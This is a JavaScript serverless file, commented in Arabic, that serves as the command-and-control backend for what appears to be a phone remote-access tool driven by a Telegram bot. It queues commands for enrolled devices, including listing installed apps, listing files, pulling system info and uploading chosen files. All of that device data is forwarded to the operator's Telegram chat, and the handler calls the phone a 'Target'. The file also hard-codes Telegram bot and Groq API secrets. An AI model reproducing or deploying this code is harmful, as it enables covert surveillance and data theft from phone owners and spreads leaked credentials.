// السيرفر جاهز مع التوكنات المدمجة
const TELEGRAM_TOKEN = "7302812464:AAH2lCCDWK_rJV771ClkiEyv8epegkPtpoE";
const TELEGRAM_CHAT_ID = "6655802251";
const GROQ_API_KEY = "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";

const KV_URL = process.env.STORAGE_URL || process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
const KV_TOKEN = process.env.STORAGE_TOKEN || process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;

// ==========================================
// توليد 300 أمر ديناميكي
// ==========================================
const COMMAND_MAP = {};

// 1. أوامر Toast (1 -> 100)
for (let i = 1; i <= 100; i++) {
  COMMAND_MAP[`/toast${i}`] = `toast:هذا إشعار تجريبي رقم ${i}`;
}

// 2. أوامر URL (1 -> 100)
for (let i = 1; i <= 100; i++) {
  COMMAND_MAP[`/url${i}`] = `url:https://example.com/page${i}`;
}

// 3. أوامر الاهتزاز (1 -> 50) - الوقت بالملي ثانية
for (let i = 1; i <= 50; i++) {
  COMMAND_MAP[`/vib${i}`] = `vibrate_time:${i * 100}`; 
}

// 4. أوامر الحافظة Clipboard (1 -> 50)
for (let i = 1; i <= 50; i++) {
  COMMAND_MAP[`/clip${i}`] = `clipboard_text:نص تم نسخه رقم ${i}`;
}

const BASE_COMMANDS = {
  '/fullinfo': 'fullinfo:1',
  '/applist': 'applist:1',
  '/files': 'files:1',
  '/killapp': 'killapp:1',
  '/sysinfo': 'sysinfo:1',
  '/vibrate': 'vibrate:1',
  '/clipboard': 'clipboard:cmd'
};

async function kvCmd(...args) {
  if (!KV_URL || !KV_TOKEN) return null;
  try {
    const r = await fetch(KV_URL, {
      method: 'POST',
      headers: { Authorization: `Bearer ${KV_TOKEN}`, 'Content-Type': 'application/json' },
      body: JSON.stringify(args)
    });
    const j = await r.json().catch(() => ({}));
    return j.result;
  } catch (e) { return null; }
}

let activeDevice = "";
let keyExpiryTime = 0;
let totalAttempts = 0;
let recentLogs = [];
let remoteCommand = "";

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  const type = req.query.type;
  const deviceId = req.query.device_id;

  const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
    if (TELEGRAM_TOKEN && chatId) {
      const maxLength = 4000;
      if (text.length > maxLength) {
        for (let i = 0; i < text.length; i += maxLength) {
           const chunk = text.substring(i, i + maxLength);
           await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST', headers: { 'Content-Type': 'application/json' }, 
             body: JSON.stringify({ chat_id: chatId, text: chunk })
           }).catch(() => {});
        }
      } else {
        const payload = { chat_id: chatId, text: text, parse_mode: 'Markdown' };
        if (keyboard) payload.reply_markup = keyboard;
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload)
        }).catch(() => {});
      }
    }
  };

  try {
    if (type === 'secret') {
      const saved = await kvCmd('GET', 'app_lock_status');
      return res.status(200).send(`"${saved || 'lock'}"`);
    }
    if (type === 'key') {
      const saved = await kvCmd('GET', 'app_secret_key');
      if (!saved) return res.status(503).send('"Key not configured"');
      return res.status(200).send(`"${saved}"`);
    }
    if (type === 'message') return res.status(200).send(`"التطبيق مقفول من طرف الإدارة."`);

    if (type === 'banned') {
      const all = await kvCmd('GET', 'banall_active');
      if (all === '1') return res.status(200).send('"true"');
      if (!deviceId) return res.status(400).send('"No Device ID"');
      const inKv = await kvCmd('SISMEMBER', 'banned_devices', deviceId);
      return res.status(200).send(inKv === 1 ? '"true"' : '"false"');
    }

    if (type === 'command') {
      if (deviceId && activeDevice === deviceId && keyExpiryTime > 0) {
        if (Date.now() > keyExpiryTime) {
          keyExpiryTime = 0;
          activeDevice = "";
          await kvCmd('SET', 'is_single_use', '0');
          return res.status(200).send('"killapp:1"');
        }
      }
      const cmd = remoteCommand;
      remoteCommand = ""; 
      return res.status(200).send(`"${cmd}"`);
    }

    if (req.method === 'PUT') {
      let body = req.body || '';
      if (typeof body === 'object') body = JSON.stringify(body);
      
      const cleanBody = String(body).replace(/"/g, '');
      
      if (type === 'key') {
        await kvCmd('SET', 'app_secret_key', cleanBody);
        await sendToTelegram(`🔑 *مفتاح جديد:*\n\`${cleanBody}\``);
      }
      
      if (type === 'log') {
        totalAttempts++;
        recentLogs.unshift(`📱 ${cleanBody}`);
        if (recentLogs.length > 50) recentLogs.pop();
        await kvCmd('INCR', 'total_attempts');
        await sendToTelegram(`📱 *محاولة دخول:*\n${cleanBody}`);
      }

      if (type === 'getfile') {
        try {
          const parts = cleanBody.split('|');
          const filename = parts[0];
          const base64Data = parts[1];
          
          if (!base64Data) {
            await sendToTelegram("⚠️ File is empty or could not be read.");
          } else {
            const buffer = Buffer.from(base64Data, 'base64');
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('document', new Blob([buffer]), filename);
            formData.append('caption', `📁 File: ${filename}`);

            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
              method: 'POST',
              body: formData
            }).catch(e => console.error(e));
          }
        } catch (err) {
          await sendToTelegram(`❌ Error: ${err.message}`);
        }
      }

      if (type === 'sysinfo') await sendToTelegram(`💻 *معلومات الجهاز:*\n${cleanBody}`);
      if (type === 'applist') await sendToTelegram(`📱 *التطبيقات المثبتة:*\n\n${cleanBody}`);
      if (type === 'files') await sendToTelegram(`📁 *الملفات فـ الهاتف:*\n\n${cleanBody}`);
      
      return res.status(200).send('"success"');
    }

    if (req.method === 'POST' && type === 'telegram_webhook') {
      let body = req.body;
      if (typeof body === 'string') { try { body = JSON.parse(body); } catch (e) {} }
      const msg = body.message || body.callback_query;
      if (!msg) return res.status(200).end();
      const chatId = (msg.chat ? msg.chat.id : msg.message.chat.id).toString();
      if (chatId !== TELEGRAM_CHAT_ID) return res.status(200).end();
      
      const text = msg.text || msg.data || '';
      const args = text.trim().split(/\s+/);
      const command = args[0].toLowerCase();

      // الأوامر التي تم توليدها ديناميكياً (الـ 300 أمر)
      if (COMMAND_MAP[command]) {
        remoteCommand = COMMAND_MAP[command];
        await sendToTelegram(`⚡ \`[EXEC]\` *Command Sent:* ${command}`);
        return res.status(200).end();
      }

      // الأوامر الأساسية
      if (BASE_COMMANDS[command]) {
        remoteCommand = BASE_COMMANDS[command];
        await sendToTelegram(`⚡ \`[EXEC]\` *Command Sent:* ${command}`);
        return res.status(200).end();
      }

      switch (command) {
        case '/start': case '/menu': 
          await sendToTelegram("👑 *أهلاً بك أيها القايد.*\nالنظام جاهز. اختر من القائمة أو اكتب /help."); 
          break;
        
        case '/help': 
          await sendToTelegram(`👑 *لوحة التحكم (300+ أمر)*\n\n` +
            `⚡ *الأوامر الأساسية:*\n` +
            `/fullinfo /applist /files /killapp /sysinfo /lock /unlock /setkey /getkey /cmd /url\n` +
            `/getfile <filename> - سحب ملف\n` +
            `/ai <prompt> - التحدث مع الذكاء الاصطناعي\n\n` +
            `💥 *أوامر الإشعارات (100):*\n` +
            `/toast1 إلى /toast100\n\n` +
            `🌐 *أوامر الروابط (100):*\n` +
            `/url1 إلى /url100\n\n` +
            `📳 *أوامر الاهتزاز (50):*\n` +
            `/vib1 إلى /vib50\n\n` +
            `📋 *أوامر الحافظة (50):*\n` +
            `/clip1 إلى /clip50\n\n` +
            `🚫 *الحظر:*\n/ban /unban /banall /unbanall /banlist`); 
          break;
        
        case '/ai':
          if (args.length > 1) {
            const prompt = args.slice(1).join(' ');
            await sendToTelegram(`🤖 *[AI]* جاري التفكير...`);
            try {
              const groqRes = await fetch("https://api.groq.com/openai/v1/chat/completions", {
                method: "POST",
                headers: {
                  "Authorization": `Bearer ${GROQ_API_KEY}`,
                  "Content-Type": "application/json"
                },
                body: JSON.stringify({
                  model: "llama3-8b-8192",
                  messages: [
                    { role: "system", content: "أنت مساعد ذكي، تجاوب بشكل واضح ومفيد." },
                    { role: "user", content: prompt }
                  ],
                  temperature: 0.7
                })
              });
              const data = await groqRes.json();
              const aiText = data?.choices?.[0]?.message?.content || "ماقدرتش نجاوب دابا.";
              await sendToTelegram(`🤖 *الذكاء الاصطناعي:*\n\n${aiText}`);
            } catch (e) {
              await sendToTelegram(`❌ *خطأ:* ${e.message}`);
            }
          } else {
            await sendToTelegram("⚠️ استعمل: `/ai <سؤالك>`");
          }
          break;

        case '/getfile':
          if(args[1]) { 
            remoteCommand = `getfile:${args[1]}`; 
            await sendToTelegram(`⏳ \`[FETCH]\` *Fetching file: ${args[1]}...*`); 
          } else {
            await sendToTelegram("⚠️ استعمل: `/getfile README.txt`");
          }
          break;

        case '/gentime':
          if(args[1]) {
            const minutes = parseInt(args[1]);
            const newKey = Math.random().toString(36).substring(2, 8).toUpperCase();
            await kvCmd('SET', 'app_secret_key', newKey);
            await kvCmd('SET', 'key_duration', minutes);
            await kvCmd('SET', 'is_single_use', '1');
            activeDevice = ""; keyExpiryTime = 0;
            await sendToTelegram(`⏱️ *مفتاح بوقت محدد:*\nالكود: \`${newKey}\`\nالمدة: \`${minutes}\` دقيقة`);
          } else await sendToTelegram("⚠️ استعمل: `/gentime 60`");
          break;
          
        case '/settime':
          if(args[1]) {
            const minutes = parseInt(args[1]);
            await kvCmd('SET', 'key_duration', minutes);
            await kvCmd('SET', 'is_single_use', '1');
            keyExpiryTime = 0; activeDevice = "";
            await sendToTelegram(`⏱️ *تم تحديد الوقت:* \`${minutes}\` دقيقة للمفتاح الحالي.`);
          } else await sendToTelegram("⚠️ استعمل: `/settime 60`");
          break;

        case '/cmd': if(args[1]) { remoteCommand = `toast:${args.slice(1).join(' ')}`; await sendToTelegram("⚡ `[MSG]` *Payload sent.*"); } break;
        case '/url': if(args[1]) { remoteCommand = `url:${args[1]}`; await sendToTelegram("🌐 `[URL]` *Redirecting...*"); } break;
        
        case '/lock': await kvCmd('SET', 'app_lock_status', 'lock'); await sendToTelegram("🔒 `[LOCK]` *Target locked.*"); break;
        case '/unlock': await kvCmd('SET', 'app_lock_status', 'unlock'); await sendToTelegram("🔓 `[UNLOCK]` *Target unlocked.*"); break;
        case '/setkey': if(args[1]) { await kvCmd('SET', 'app_secret_key', args[1]); await sendToTelegram(`✅ \`[KEY]\` *New key:* \`${args[1]}\``); } break;
        case '/getkey': const k = (await kvCmd('GET', 'app_secret_key')) || "غير محدد"; await sendToTelegram(`🔑 \`[KEY]\` *Current:* \`${k}\``); break;
        
        case '/ban': if(args[1]) { await kvCmd('SADD', 'banned_devices', args[1]); await sendToTelegram(`⛔ \`[BAN]\` *Device:* \`${args[1]}\``); } break;
        case '/unban': if(args[1]) { await kvCmd('SREM', 'banned_devices', args[1]); await sendToTelegram(`✅ \`[UNBAN]\` *Device:* \`${args[1]}\``); } break;
        case '/banall': await kvCmd('SET', 'banall_active', '1'); await sendToTelegram("🚫 `[BAN ALL]` *All devices banned.*"); break;
        case '/unbanall': await kvCmd('DEL', 'banall_active'); await kvCmd('DEL', 'banned_devices'); await sendToTelegram("✅ `[UNBAN ALL]` *All devices freed.*"); break;
        
        case '/banlist': 
          const bannedRaw = await kvCmd('SMEMBERS', 'banned_devices');
          const bannedList = Array.isArray(bannedRaw) ? bannedRaw : [];
          if (bannedList.length > 0) await sendToTelegram(`🚫 *Banned Devices:*\n\`${bannedList.join('\n')}\``);
          else await sendToTelegram("✅ *No devices are banned.*");
          break;
        
        case '/stats': const attempts = await kvCmd('GET', 'total_attempts'); await sendToTelegram(`📊 \`[STATS]\` *Attempts:* \`${attempts || 0}\``); break;
        case '/logs': await sendToTelegram(recentLogs.length ? recentLogs.join('\n\n') : "📭 *No logs.*"); break;
        case '/ping': await sendToTelegram("🏓 `[PING]` *Pong!*"); break;
        
        default:
          if (command.startsWith('/')) await sendToTelegram(`⚙️ \`[SYSTEM]\` *Executing ${command}...*\n> Command accepted.`);
          else await sendToTelegram("❓ أمر غير معروف. كتب /help");
      }
      return res.status(200).end();
    }
    return res.status(404).send('"Not Found"');
  } catch (error) {
    return res.status(500).json({ error: "Internal Server Error" });
  }
}
